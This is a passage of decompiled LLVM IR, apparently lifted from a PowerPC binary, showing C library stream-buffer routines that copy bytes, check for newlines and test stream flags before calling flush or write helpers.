  %v0_10009ca8 = load i32, i32* @r30, align 4
  %v1_10009ca8 = add i32 %v0_10009ca8, 4
  %v2_10009ca8 = inttoptr i32 %v1_10009ca8 to i32*
  %v3_10009ca8 = load i32, i32* %v2_10009ca8, align 4
  store i32 268475572, i32* @lr, align 4
  %v3_10009cb0 = call i32 @function_10004dd0(i32 %v3_10009ca8, i32 %v0_10009cac)
  %v1_10009cb4 = icmp slt i32 %v3_10009cb0, 0
  br i1 %v1_10009cb4, label %dec_label_pc_10009cc8, label %dec_label_pc_10009cbc

dec_label_pc_10009cbc:                            ; preds = %dec_label_pc_10009ca8
  %v0_10009cbc = load i32, i32* @r29, align 4
  %v2_10009cbc = add i32 %v0_10009cbc, %v3_10009cb0
  store i32 %v2_10009cbc, i32* @r29, align 4
  %v1_10009cc0 = load i32, i32* @r31, align 4
  %v2_10009cc0 = sub i32 %v1_10009cc0, %v3_10009cb0
  store i32 %v2_10009cc0, i32* @r31, align 4
  %v3_10009c8c = icmp eq i32 %v2_10009cc0, 0
  store i32 %v2_10009cc0, i32* @r27, align 4
  br i1 %v3_10009c8c, label %dec_label_pc_10009c8c.dec_label_pc_10009d34.loopexit_crit_edge, label %dec_label_pc_10009c9c

dec_label_pc_10009cc8:                            ; preds = %dec_label_pc_10009ca8
  %v0_10009cc8 = load i32, i32* @r30, align 4
  %v1_10009cc8 = add i32 %v0_10009cc8, 8
  %v2_10009cc8 = inttoptr i32 %v1_10009cc8 to i32*
  %v3_10009cc8 = load i32, i32* %v2_10009cc8, align 4
  store i32 %v3_10009cc8, i32* %r11.global-to-local, align 4
  %v1_10009ccc = add i32 %v0_10009cc8, 12
  %v2_10009ccc = inttoptr i32 %v1_10009ccc to i32*
  %v3_10009ccc = load i32, i32* %v2_10009ccc, align 4
  store i32 %v3_10009ccc, i32* %r0.global-to-local, align 4
  %v1_10009cd0 = inttoptr i32 %v0_10009cc8 to i16*
  %v2_10009cd0 = load i16, i16* %v1_10009cd0, align 2
  %v2_10009cd4 = sub i32 %v3_10009ccc, %v3_10009cc8
  store i32 %v2_10009cd4, i32* %r0.global-to-local, align 4
  %v5_10009cd4 = icmp eq i32 %v2_10009cd4, 0
  %v1_10009cd8 = or i16 %v2_10009cd0, 8
  store i16 %v1_10009cd8, i16* %v1_10009cd0, align 2
  br i1 %v5_10009cd4, label %dec_label_pc_10009cc8.dec_label_pc_10009d30_crit_edge, label %dec_label_pc_10009ce4

dec_label_pc_10009cc8.dec_label_pc_10009d30_crit_edge: ; preds = %dec_label_pc_10009cc8
  %v0_10009d30.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009d30

dec_label_pc_10009ce4:                            ; preds = %dec_label_pc_10009cc8
  %v0_10009ce4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009ce4 = load i32, i32* @r31, align 4
  %v3_10009ce4 = icmp ugt i32 %v0_10009ce4, %v1_10009ce4
  br i1 %v3_10009ce4, label %dec_label_pc_10009ce4.dec_label_pc_10009cf0_crit_edge, label %dec_label_pc_10009cec

dec_label_pc_10009ce4.dec_label_pc_10009cf0_crit_edge: ; preds = %dec_label_pc_10009ce4
  %v0_10009cf0.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10009cf0

dec_label_pc_10009cec:                            ; preds = %dec_label_pc_10009ce4
  store i32 %v0_10009ce4, i32* @r27, align 4
  br label %dec_label_pc_10009cf0

dec_label_pc_10009cf0:                            ; preds = %dec_label_pc_10009ce4.dec_label_pc_10009cf0_crit_edge, %dec_label_pc_10009cec
  %v0_10009cf0 = phi i32 [ %v0_10009cf0.pre, %dec_label_pc_10009ce4.dec_label_pc_10009cf0_crit_edge ], [ %v0_10009ce4, %dec_label_pc_10009cec ]
  store i32 %v0_10009cf0, i32* %ctr.global-to-local, align 4
  %v2_10009cfc.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009cf4

dec_label_pc_10009cf4:                            ; preds = %dec_label_pc_10009d18, %dec_label_pc_10009cf0
  %v2_10009cfc = phi i32 [ %v1_10009d18, %dec_label_pc_10009d18 ], [ %v2_10009cfc.pre, %dec_label_pc_10009cf0 ]
  %v0_10009cf4 = load i32, i32* @r29, align 4
  %v1_10009cf4 = inttoptr i32 %v0_10009cf4 to i8*
  %v2_10009cf4 = load i8, i8* %v1_10009cf4, align 1
  %v3_10009cf4 = zext i8 %v2_10009cf4 to i32
  store i32 %v3_10009cf4, i32* %r0.global-to-local, align 4
  %v1_10009cf8 = add i32 %v0_10009cf4, 1
  store i32 %v1_10009cf8, i32* @r29, align 4
  %v3_10009cfc = inttoptr i32 %v2_10009cfc to i8*
  store i8 %v2_10009cf4, i8* %v3_10009cfc, align 1
  %v0_10009d00 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009d00 = urem i32 %v0_10009d00, 256
  store i32 %v1_10009d00, i32* %r0.global-to-local, align 4
  %v3_10009d04 = icmp eq i32 %v1_10009d00, 10
  br i1 %v3_10009d04, label %dec_label_pc_10009d0c, label %dec_label_pc_10009d18

dec_label_pc_10009d0c:                            ; preds = %dec_label_pc_10009cf4
  %v0_10009d0c = load i32, i32* @r30, align 4
  %v1_10009d0c = inttoptr i32 %v0_10009d0c to i16*
  %v2_10009d0c = load i16, i16* %v1_10009d0c, align 2
  %v3_10009d0c = zext i16 %v2_10009d0c to i32
  store i32 %v3_10009d0c, i32* %r0.global-to-local, align 4
  %v1_10009d10 = and i32 %v3_10009d0c, 256
  %v3_10009d10 = icmp eq i32 %v1_10009d10, 0
  br i1 %v3_10009d10, label %dec_label_pc_10009d18, label %dec_label_pc_10009d0c.dec_label_pc_10009d20_crit_edge

dec_label_pc_10009d0c.dec_label_pc_10009d20_crit_edge: ; preds = %dec_label_pc_10009d0c
  %v0_10009d24.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009d20

dec_label_pc_10009d18:                            ; preds = %dec_label_pc_10009d0c, %dec_label_pc_10009cf4
  %v0_10009d18 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009d18 = add i32 %v0_10009d18, 1
  store i32 %v1_10009d18, i32* %r11.global-to-local, align 4
  %v0_10009d1c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009d1c = add i32 %v0_10009d1c, -1
  store i32 %v1_10009d1c, i32* %ctr.global-to-local, align 4
  %v2_10009d1c = icmp eq i32 %v1_10009d1c, 0
  br i1 %v2_10009d1c, label %dec_label_pc_10009d18.dec_label_pc_10009d20_crit_edge, label %dec_label_pc_10009cf4

dec_label_pc_10009d18.dec_label_pc_10009d20_crit_edge: ; preds = %dec_label_pc_10009d18
  %v0_10009d20.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009d20

dec_label_pc_10009d20:                            ; preds = %dec_label_pc_10009d0c.dec_label_pc_10009d20_crit_edge, %dec_label_pc_10009d18.dec_label_pc_10009d20_crit_edge
  %v0_10009d24 = phi i32 [ %v1_10009d18, %dec_label_pc_10009d18.dec_label_pc_10009d20_crit_edge ], [ %v0_10009d24.pre, %dec_label_pc_10009d0c.dec_label_pc_10009d20_crit_edge ]
  %v0_10009d20 = phi i32 [ %v0_10009d20.pre, %dec_label_pc_10009d18.dec_label_pc_10009d20_crit_edge ], [ %v0_10009d0c, %dec_label_pc_10009d0c.dec_label_pc_10009d20_crit_edge ]
  %v1_10009d20 = add i32 %v0_10009d20, 8
  %v2_10009d20 = inttoptr i32 %v1_10009d20 to i32*
  %v3_10009d20 = load i32, i32* %v2_10009d20, align 4
  store i32 %v3_10009d20, i32* %r0.global-to-local, align 4
  %v2_10009d24 = add i32 %v0_10009d20, 16
  %v3_10009d24 = inttoptr i32 %v2_10009d24 to i32*
  store i32 %v0_10009d24, i32* %v3_10009d24, align 4
  %v0_10009d28 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009d28 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009d28 = sub i32 %v1_10009d28, %v0_10009d28
  store i32 %v2_10009d28, i32* %r0.global-to-local, align 4
  %v1_10009d2c = load i32, i32* @r31, align 4
  %v2_10009d2c = sub i32 %v1_10009d2c, %v2_10009d28
  store i32 %v2_10009d2c, i32* @r31, align 4
  br label %dec_label_pc_10009d30

dec_label_pc_10009d30:                            ; preds = %dec_label_pc_10009cc8.dec_label_pc_10009d30_crit_edge, %dec_label_pc_10009d20
  %v0_10009d30 = phi i32 [ %v0_10009d30.pre, %dec_label_pc_10009cc8.dec_label_pc_10009d30_crit_edge ], [ %v2_10009d2c, %dec_label_pc_10009d20 ]
  %v1_10009d30 = load i32, i32* @r28, align 4
  %v2_10009d30 = sub i32 %v1_10009d30, %v0_10009d30
  store i32 %v2_10009d30, i32* @r28, align 4
  br label %dec_label_pc_10009d34

dec_label_pc_10009c8c.dec_label_pc_10009d34.loopexit_crit_edge: ; preds = %dec_label_pc_10009cbc
  %v0_10009d38.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009d34

dec_label_pc_10009d34:                            ; preds = %dec_label_pc_10009c6c, %dec_label_pc_10009c8c.dec_label_pc_10009d34.loopexit_crit_edge, %dec_label_pc_10009d30
  %v0_10009d38 = phi i32 [ %v2_10009d30, %dec_label_pc_10009d30 ], [ %v0_10009d38.pre.pre, %dec_label_pc_10009c8c.dec_label_pc_10009d34.loopexit_crit_edge ], [ 0, %dec_label_pc_10009c6c ]
  store i32 %v0_10009c6c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10009d38

; uselistorder directives
  uselistorder i32 %v0_10009d20, { 1, 0 }
  uselistorder i32 %v1_10009d1c, { 1, 0 }
  uselistorder i32 %v1_10009d18, { 0, 2, 1 }
  uselistorder i32 %v1_10009d00, { 1, 0 }
  uselistorder i32 %v2_10009cc0, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10009cbc, { 1, 0 }
  uselistorder i32 %v3_10009cb0, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 2, 1, 5 }
  uselistorder label %dec_label_pc_10009d34, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009d30, { 1, 0 }
  uselistorder label %dec_label_pc_10009d20, { 1, 0 }
  uselistorder label %dec_label_pc_10009cf0, { 1, 0 }
  uselistorder label %dec_label_pc_10009ca8, { 1, 0 }
  uselistorder label %dec_label_pc_10009c9c, { 1, 0 }
}

define i32 @function_10009d4c(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
dec_label_pc_10009d4c:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_10009d4c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_10009d68 = load i16, i16* %arg3, align 2
  %v1_10009d6c = and i16 %v3_10009d68, 512
  %v3_10009d6c = icmp eq i16 %v1_10009d6c, 0
  br i1 %v3_10009d6c, label %dec_label_pc_10009d74, label %dec_label_pc_10009e80

dec_label_pc_10009d74:                            ; preds = %dec_label_pc_10009d4c
  %v2_10009d74 = add i32 %tmp, 4
  %v3_10009d74 = inttoptr i32 %v2_10009d74 to i32*
  %v4_10009d74 = load i32, i32* %v3_10009d74, align 4
  %v2_10009d78 = add i32 %tmp, 16
  %v3_10009d78 = inttoptr i32 %v2_10009d78 to i32*
  %v4_10009d78 = load i32, i32* %v3_10009d78, align 4
  store i32 %v4_10009d78, i32* @r3, align 4
  %v3_10009d7c = icmp eq i32 %v4_10009d74, -2
  %v2_10009d80 = add i32 %tmp, 12
  %v3_10009d80 = inttoptr i32 %v2_10009d80 to i32*
  %v4_10009d80 = load i32, i32* %v3_10009d80, align 4
  %v2_10009d88 = sub i32 %v4_10009d80, %v4_10009d78
  br i1 %v3_10009d7c, label %dec_label_pc_10009d88, label %dec_label_pc_10009db8

dec_label_pc_10009d88:                            ; preds = %dec_label_pc_10009d74
  %v3_10009d90 = icmp ult i32 %v2_10009d88, %arg2
  br i1 %v3_10009d90, label %dec_label_pc_10009d98, label %dec_label_pc_10009d9c

dec_label_pc_10009d98:                            ; preds = %dec_label_pc_10009d88
  br label %dec_label_pc_10009d9c

dec_label_pc_10009d9c:                            ; preds = %dec_label_pc_10009d88, %dec_label_pc_10009d98
  %storemerge = phi i32 [ %v2_10009d88, %dec_label_pc_10009d98 ], [ %arg2, %dec_label_pc_10009d88 ]
  %v0_10009da0 = phi i32 [ %v2_10009d88, %dec_label_pc_10009d98 ], [ %arg2, %dec_label_pc_10009d88 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10009da0, i32* @r5, align 4
  store i32 268475816, i32* @lr, align 4
  %v0_10009da4 = call i32 @function_10007108()
  %v0_10009da8 = load i32, i32* @r30, align 4
  %v1_10009da8 = add i32 %v0_10009da8, 16
  %v2_10009da8 = inttoptr i32 %v1_10009da8 to i32*
  %v3_10009da8 = load i32, i32* %v2_10009da8, align 4
  %v1_10009dac = load i32, i32* @r31, align 4
  %v2_10009dac = add i32 %v1_10009dac, %v3_10009da8
  store i32 %v2_10009dac, i32* %v2_10009da8, align 4
  br label %dec_label_pc_10009ea0

dec_label_pc_10009db8:                            ; preds = %dec_label_pc_10009d74
  %v3_10009dbc = icmp ult i32 %v2_10009d88, %arg2
  br i1 %v3_10009dbc, label %dec_label_pc_10009e5c, label %dec_label_pc_10009dc4

dec_label_pc_10009dc4:                            ; preds = %dec_label_pc_10009db8
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268475856, i32* @lr, align 4
  %v0_10009dcc = call i32 @function_10007108()
  %v0_10009dd0 = load i32, i32* @r30, align 4
  %v1_10009dd0 = inttoptr i32 %v0_10009dd0 to i16*
  %v2_10009dd0 = load i16, i16* %v1_10009dd0, align 2
  %v1_10009dd4 = add i32 %v0_10009dd0, 16
  %v2_10009dd4 = inttoptr i32 %v1_10009dd4 to i32*
  %v3_10009dd4 = load i32, i32* %v2_10009dd4, align 4
  %v1_10009dd8 = and i16 %v2_10009dd0, 256
  %v3_10009dd8 = icmp eq i16 %v1_10009dd8, 0
  %v1_10009ddc = load i32, i32* @r29, align 4
  %v2_10009ddc = add i32 %v1_10009ddc, %v3_10009dd4
  store i32 %v2_10009ddc, i32* %v2_10009dd4, align 4
  br i1 %v3_10009dd8, label %dec_label_pc_10009ea0, label %dec_label_pc_10009de8

dec_label_pc_10009de8:                            ; preds = %dec_label_pc_10009dc4
  %v0_10009de8 = load i32, i32* @r28, align 4
  %v0_10009df0 = load i32, i32* @r29, align 4
  store i32 268475896, i32* @lr, align 4
  %v4_10009df4 = call i32 @function_1000ab40(i32 %v0_10009de8, i32 10, i32 %v0_10009df0, i32 %v2_10009ddc)
  %v3_10009df8 = icmp eq i32 %v4_10009df4, 0
  br i1 %v3_10009df8, label %dec_label_pc_10009ea0, label %dec_label_pc_10009e00

dec_label_pc_10009e00:                            ; preds = %dec_label_pc_10009de8
  %v0_10009e00 = load i32, i32* @r30, align 4
  store i32 %v0_10009e00, i32* @r3, align 4
  store i32 268475912, i32* @lr, align 4
  %v0_10009e04 = call i32 @function_10005834()
  %v3_10009e08 = icmp eq i32 %v0_10009e04, 0
  br i1 %v3_10009e08, label %dec_label_pc_10009ea0, label %dec_label_pc_10009e10

dec_label_pc_10009e10:                            ; preds = %dec_label_pc_10009e00
  %v0_10009e10 = load i32, i32* @r29, align 4
  %v3_10009e10 = icmp ugt i32 %v0_10009e10, %v0_10009e04
  %v0_10009e04.v0_10009e14 = select i1 %v3_10009e10, i32 %v0_10009e04, i32 %v0_10009e10
  store i32 %v0_10009e04.v0_10009e14, i32* @r31, align 4
  %v2_10009e20 = sub i32 %v0_10009e10, %v0_10009e04.v0_10009e14
  %v0_10009e28 = load i32, i32* @r28, align 4
  %v2_10009e28 = add i32 %v0_10009e28, %v2_10009e20
  store i32 %v2_10009e28, i32* @r28, align 4
  store i32 %v2_10009e28, i32* @r3, align 4
  store i32 268475960, i32* @lr, align 4
  %v3_10009e34 = call i32 @function_1000aa04(i32 %v2_10009e28, i32 10, i32 %v0_10009e04.v0_10009e14)
  %v3_10009e38 = icmp eq i32 %v3_10009e34, 0
  br i1 %v3_10009e38, label %dec_label_pc_10009ea0, label %dec_label_pc_10009e40

dec_label_pc_10009e40:                            ; preds = %dec_label_pc_10009e10
  %v0_10009e40 = load i32, i32* @r30, align 4
  %v1_10009e40 = add i32 %v0_10009e40, 16
  %v2_10009e40 = inttoptr i32 %v1_10009e40 to i32*
  %v3_10009e40 = load i32, i32* %v2_10009e40, align 4
  %v0_10009e44 = load i32, i32* @r28, align 4
  %v1_10009e44 = load i32, i32* @r31, align 4
  %v2_10009e44 = sub i32 %v0_10009e44, %v3_10009e34
  %v2_10009e48 = add i32 %v2_10009e44, %v1_10009e44
  %v2_10009e4c = sub i32 %v3_10009e40, %v2_10009e48
  %v1_10009e50 = load i32, i32* @r29, align 4
  %v2_10009e50 = sub i32 %v1_10009e50, %v2_10009e48
  store i32 %v2_10009e50, i32* @r29, align 4
  store i32 %v2_10009e4c, i32* %v2_10009e40, align 4
  br label %dec_label_pc_10009ea0

dec_label_pc_10009e5c:                            ; preds = %dec_label_pc_10009db8
  %v2_10009e5c = add i32 %tmp, 8
  %v3_10009e5c = inttoptr i32 %v2_10009e5c to i32*
  %v4_10009e5c = load i32, i32* %v3_10009e5c, align 4
  %v4_10009e60 = icmp eq i32 %v4_10009d78, %v4_10009e5c
  br i1 %v4_10009e60, label %dec_label_pc_10009e80, label %dec_label_pc_10009e68

dec_label_pc_10009e68:                            ; preds = %dec_label_pc_10009e5c
  store i32 %tmp, i32* @r3, align 4
  store i32 268476016, i32* @lr, align 4
  %v0_10009e6c = call i32 @function_10005834()
  %v3_10009e70 = icmp eq i32 %v0_10009e6c, 0
  br i1 %v3_10009e70, label %dec_label_pc_10009e68.dec_label_pc_10009e80_crit_edge, label %dec_label_pc_10009e78

dec_label_pc_10009e68.dec_label_pc_10009e80_crit_edge: ; preds = %dec_label_pc_10009e68
  %v0_10009e84.pre = load i32, i32* @r30, align 4
  %v0_10009e88.pre = load i32, i32* @r28, align 4
  %v0_10009e8c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009e80

dec_label_pc_10009e78:                            ; preds = %dec_label_pc_10009e68
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10009ea0

dec_label_pc_10009e80:                            ; preds = %dec_label_pc_10009e68.dec_label_pc_10009e80_crit_edge, %dec_label_pc_10009d4c, %dec_label_pc_10009e5c
  %v0_10009e8c = phi i32 [ %v0_10009e8c.pre, %dec_label_pc_10009e68.dec_label_pc_10009e80_crit_edge ], [ %arg2, %dec_label_pc_10009d4c ], [ %arg2, %dec_label_pc_10009e5c ]
  %v0_10009e88 = phi i32 [ %v0_10009e88.pre, %dec_label_pc_10009e68.dec_label_pc_10009e80_crit_edge ], [ %arg1, %dec_label_pc_10009d4c ], [ %arg1, %dec_label_pc_10009e5c ]
  %v0_10009e84 = phi i32 [ %v0_10009e84.pre, %dec_label_pc_10009e68.dec_label_pc_10009e80_crit_edge ], [ %tmp, %dec_label_pc_10009d4c ], [ %tmp, %dec_label_pc_10009e5c ]
  %v1_10009e84 = inttoptr i32 %v0_10009e84 to i16*
  store i32 %v0_10009e8c, i32* @r5, align 4
  store i32 %v0_10009d4c, i32* @lr, align 4
  %v5_10009e9c = call i32 @function_10009c6c(i16* %v1_10009e84, i32 %v0_10009e88)
  br label %dec_label_pc_10009ea0

dec_label_pc_10009ea0:                            ; preds = %dec_label_pc_10009e10, %dec_label_pc_10009e00, %dec_label_pc_10009de8, %dec_label_pc_10009dc4, %dec_label_pc_10009e78, %dec_label_pc_10009e40, %dec_label_pc_10009d9c, %dec_label_pc_10009e80
  %v0_10009ea4 = load i32, i32* @r29, align 4
  ret i32 %v0_10009ea4

; uselistorder directives
  uselistorder i32 %v2_10009e48, { 1, 0 }
  uselistorder i32 %v0_10009e04.v0_10009e14, { 0, 2, 1 }
  uselistorder i32 %v0_10009e10, { 1, 0, 2 }
  uselistorder i32 %v2_10009d88, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10009ea0, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10009e80, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009d9c, { 1, 0 }
}

define i32 @function_10009eb8(i16* %arg1) local_unnamed_addr {
dec_label_pc_10009eb8:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10009eb8 = load i32, i32* @lr, align 4
  store i32 %v0_10009eb8, i32* %r0.global-to-local, align 4
  %v0_10009ec0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10009ecc = load i16, i16* %arg1, align 2
  %v4_10009ecc = zext i16 %v3_10009ecc to i32
  store i32 %v4_10009ecc, i32* %r0.global-to-local, align 4
  %v1_10009ed0 = load i32, i32* @r4, align 4
  %v2_10009ed0 = and i32 %v1_10009ed0, %v4_10009ecc
  store i32 %v2_10009ed0, i32* %r9.global-to-local, align 4
  %v5_10009ed0 = icmp eq i32 %v2_10009ed0, 0
  br i1 %v5_10009ed0, label %dec_label_pc_10009ed8, label %dec_label_pc_10009ee8

dec_label_pc_10009ed8:                            ; preds = %dec_label_pc_10009eb8
  %v1_10009ed8 = and i32 %v4_10009ecc, 2176
  store i32 %v1_10009ed8, i32* %r9.global-to-local, align 4
  %v3_10009ed8 = icmp eq i32 %v1_10009ed8, 0
  br i1 %v3_10009ed8, label %dec_label_pc_10009ee0, label %dec_label_pc_10009ef4

dec_label_pc_10009ee0:                            ; preds = %dec_label_pc_10009ed8
  %v2_10009ee0 = or i32 %v1_10009ed0, %v4_10009ecc
  store i32 %v2_10009ee0, i32* %r0.global-to-local, align 4
  %v1_10009ee4 = trunc i32 %v2_10009ee0 to i16
  store i16 %v1_10009ee4, i16* %arg1, align 2
  %v0_10009ee8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009ee8

dec_label_pc_10009ee8:                            ; preds = %dec_label_pc_10009eb8, %dec_label_pc_10009ee0
  %v0_10009f24 = phi i32 [ %tmp, %dec_label_pc_10009eb8 ], [ %v0_10009ee8.pre, %dec_label_pc_10009ee0 ]
  %v1_10009ee8 = inttoptr i32 %v0_10009f24 to i16*
  %v2_10009ee8 = load i16, i16* %v1_10009ee8, align 2
  %v3_10009ee8 = zext i16 %v2_10009ee8 to i32
  %v1_10009eec = and i32 %v3_10009ee8, 32
  store i32 %v1_10009eec, i32* %r0.global-to-local, align 4
  %v3_10009eec = icmp eq i32 %v1_10009eec, 0
  br i1 %v3_10009eec, label %dec_label_pc_10009f14, label %dec_label_pc_10009ef4

dec_label_pc_10009ef4:                            ; preds = %dec_label_pc_10009ed8, %dec_label_pc_10009ee8
  %v0_10009ef4 = call i32 @function_10004e38()
  store i32 %v0_10009ef4, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10009efc = inttoptr i32 %v0_10009ef4 to i32*
  store i32 9, i32* %v2_10009efc, align 4
  br label %dec_label_pc_10009f00

dec_label_pc_10009f00:                            ; preds = %dec_label_pc_10009f3c, %dec_label_pc_10009ef4
  %v0_10009f00 = load i32, i32* @r31, align 4
  %v1_10009f00 = inttoptr i32 %v0_10009f00 to i16*
  %v2_10009f00 = load i16, i16* %v1_10009f00, align 2
  %v3_10009f00 = zext i16 %v2_10009f00 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10009f08 = or i32 %v3_10009f00, 8
  store i32 %v1_10009f08, i32* %r0.global-to-local, align 4
  %v1_10009f0c = trunc i32 %v1_10009f08 to i16
  store i16 %v1_10009f0c, i16* %v1_10009f00, align 2
  br label %dec_label_pc_10009f9c

dec_label_pc_10009f14:                            ; preds = %dec_label_pc_10009ee8
  %tmp8 = urem i16 %v2_10009ee8, 4
  %v1_10009f14 = zext i16 %tmp8 to i32
  store i32 %v1_10009f14, i32* %r0.global-to-local, align 4
  %v3_10009f14 = icmp eq i16 %tmp8, 0
  br i1 %v3_10009f14, label %dec_label_pc_10009f78, label %dec_label_pc_10009f1c

dec_label_pc_10009f1c:                            ; preds = %dec_label_pc_10009f14
  %v1_10009f1c = and i32 %v3_10009ee8, 4
  store i32 %v1_10009f1c, i32* %r9.global-to-local, align 4
  %v3_10009f1c = icmp eq i32 %v1_10009f1c, 0
  br i1 %v3_10009f1c, label %dec_label_pc_10009f24, label %dec_label_pc_10009f5c

dec_label_pc_10009f24:                            ; preds = %dec_label_pc_10009f1c
  %v1_10009f24 = add i32 %v0_10009f24, 20
  %v2_10009f24 = inttoptr i32 %v1_10009f24 to i32*
  %v3_10009f24 = load i32, i32* %v2_10009f24, align 4
  store i32 %v3_10009f24, i32* %r0.global-to-local, align 4
  %v1_10009f28 = add i32 %v0_10009f24, 16
  %v2_10009f28 = inttoptr i32 %v1_10009f28 to i32*
  %v3_10009f28 = load i32, i32* %v2_10009f28, align 4
  store i32 %v3_10009f28, i32* %r9.global-to-local, align 4
  %v4_10009f2c = icmp eq i32 %v3_10009f24, %v3_10009f28
  br i1 %v4_10009f2c, label %dec_label_pc_10009f34, label %dec_label_pc_10009f3c

dec_label_pc_10009f34:                            ; preds = %dec_label_pc_10009f24
  %v1_10009f34 = and i32 %v3_10009ee8, 2
  store i32 %v1_10009f34, i32* %r0.global-to-local, align 4
  %v3_10009f34 = icmp eq i32 %v1_10009f34, 0
  br i1 %v3_10009f34, label %dec_label_pc_10009f5c, label %dec_label_pc_10009f3c

dec_label_pc_10009f3c:                            ; preds = %dec_label_pc_10009f24, %dec_label_pc_10009f34
  %v1_10009f3c = and i32 %v3_10009ee8, 1024
  store i32 %v1_10009f3c, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v0_10009f44 = call i32 @__asm_mfcr()
  store i32 %v0_10009f44, i32* %r3.global-to-local, align 4
  %v1_10009f48 = call i32 @__asm_rlwinm(i32 %v0_10009f44, i32 3, i32 31, i32 31)
  %v1_10009f4c = sub i32 2, %v1_10009f48
  store i32 %v1_10009f4c, i32* @r5, align 4
  store i32 268476244, i32* @lr, align 4
  %v1_10009f50 = inttoptr i32 %v1_10009f4c to i16*
  %v2_10009f50 = call i32 @function_1000bb70(i16* %v1_10009f50)
  store i32 %v2_10009f50, i32* %r3.global-to-local, align 4
  %v3_10009f54 = icmp eq i32 %v2_10009f50, 0
  br i1 %v3_10009f54, label %dec_label_pc_10009f3c.dec_label_pc_10009f5c_crit_edge, label %dec_label_pc_10009f00

dec_label_pc_10009f3c.dec_label_pc_10009f5c_crit_edge: ; preds = %dec_label_pc_10009f3c
  %v0_10009f5c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009f5c

dec_label_pc_10009f5c:                            ; preds = %dec_label_pc_10009f3c.dec_label_pc_10009f5c_crit_edge, %dec_label_pc_10009f1c, %dec_label_pc_10009f34
  %v0_10009f5c = phi i32 [ %v0_10009f5c.pre, %dec_label_pc_10009f3c.dec_label_pc_10009f5c_crit_edge ], [ %v0_10009f24, %dec_label_pc_10009f1c ], [ %v0_10009f24, %dec_label_pc_10009f34 ]
  %v1_10009f5c = inttoptr i32 %v0_10009f5c to i16*
  %v2_10009f5c = load i16, i16* %v1_10009f5c, align 2
  %v3_10009f5c = zext i16 %v2_10009f5c to i32
  store i32 %v3_10009f5c, i32* %r0.global-to-local, align 4
  %v1_10009f60 = add i32 %v0_10009f5c, 8
  %v2_10009f60 = inttoptr i32 %v1_10009f60 to i32*
  %v3_10009f60 = load i32, i32* %v2_10009f60, align 4
  store i32 %v3_10009f60, i32* %r9.global-to-local, align 4
  %v1_10009f64 = call i32 @__asm_rlwinm(i32 %v3_10009f5c, i32 0, i32 0, i32 29)
  %v2_10009f64 = trunc i32 %v1_10009f64 to i16
  store i32 %v1_10009f64, i32* %r0.global-to-local, align 4
  %v3_10009f68 = load i32, i32* @r31, align 4
  %v4_10009f68 = inttoptr i32 %v3_10009f68 to i16*
  store i16 %v2_10009f64, i16* %v4_10009f68, align 2
  %v0_10009f6c = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f6c = load i32, i32* @r31, align 4
  %v2_10009f6c = add i32 %v1_10009f6c, 20
  %v3_10009f6c = inttoptr i32 %v2_10009f6c to i32*
  store i32 %v0_10009f6c, i32* %v3_10009f6c, align 4
  %v0_10009f70 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f70 = load i32, i32* @r31, align 4
  %v2_10009f70 = add i32 %v1_10009f70, 24
  %v3_10009f70 = inttoptr i32 %v2_10009f70 to i32*
  store i32 %v0_10009f70, i32* %v3_10009f70, align 4
  %v0_10009f74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f74 = load i32, i32* @r31, align 4
  %v2_10009f74 = add i32 %v1_10009f74, 16
  %v3_10009f74 = inttoptr i32 %v2_10009f74 to i32*
  store i32 %v0_10009f74, i32* %v3_10009f74, align 4
  %v0_10009f78.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009f78

dec_label_pc_10009f78:                            ; preds = %dec_label_pc_10009f14, %dec_label_pc_10009f5c
  %v2_10009f84 = phi i32 [ %v0_10009f24, %dec_label_pc_10009f14 ], [ %v0_10009f78.pre, %dec_label_pc_10009f5c ]
  %v1_10009f78 = inttoptr i32 %v2_10009f84 to i16*
